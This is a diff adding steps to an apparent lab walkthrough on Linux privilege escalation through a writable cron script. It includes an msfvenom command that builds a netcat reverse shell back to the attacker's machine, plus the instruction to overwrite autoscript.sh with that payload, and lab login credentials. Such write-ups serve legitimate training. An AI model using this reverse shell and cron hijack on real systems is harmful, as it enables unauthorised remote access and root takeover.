@@ -50,6 +50,38 @@ password = password
 
 ## [Task 8] Exploiting Crontab 
 
+### 1 Switch user to User4 with the provided credentials 
+
+username = user4
+password = password
+
+- su user4
+![1](https://user-images.githubusercontent.com/69840849/90488480-53b9c080-e17f-11ea-8e7b-a8fcd383bbd4.png)
+
+### 2 Msfvenom
+-
+
+### 3 What is the flag to specify a payload in msfvenom?
+
+[!] You can find the answer by using 
+- msfvenom -h
+
+### 4 Create a payload using: 
+
+- msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
+[!] Reminder, LOCALIP depends on your own machine, I will be using 10.10.0.0 as an example! 
+[!] In this situation, we can use port 8888. We can use another port number such as 1234 as long as the netcat listener is also set to 1234
+![1](https://user-images.githubusercontent.com/69840849/90489384-8f08bf00-e180-11ea-9dcc-e3927b6bf169.png)
+
+### 5 What directory is the "autoscript.sh" under?
+
+- cat /etc/crontab
+![1](https://user-images.githubusercontent.com/69840849/90487765-405a2580-e17e-11ea-917b-2c482e84784c.png)
+
+### 6 Lets replace the contents of the file with our payload using: "echo [MSFVENOM OUTPUT] > autoscript.sh"
+
 ## [Task 9] Exploiting PATH Variable 
 
 ## [Task 10] Expanding Your Knowledge 
+
+Follow The Readings Provided
